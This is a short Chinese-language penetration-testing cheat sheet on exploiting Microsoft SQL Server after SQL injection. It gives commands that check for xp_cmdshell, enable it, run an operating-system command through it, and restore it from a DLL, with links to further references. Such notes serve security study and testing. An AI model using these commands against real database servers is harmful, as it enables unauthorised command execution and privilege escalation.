# MSSQL SQL注入&漏洞利用

## 基础知识
MSSQL的基本知识，SQL注入方法和漏洞利用执行和提权的方法，推荐：[MSSQL 注入与提权方法整理](https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/)

## 命令执行

### xp_cmdshell

返回1，判断存在
```
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```
开启xp_cmdshell模块
```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
```
执行命令
```
exec master..xp_cmdshell 'whoami'
```
恢复被删除的组件
```
Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
```

## Ref
- [MSSQL 注入与提权方法整理](https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/)
- https://www.freebuf.com/vuls/276814.html
- https://xz.aliyun.com/t/7534
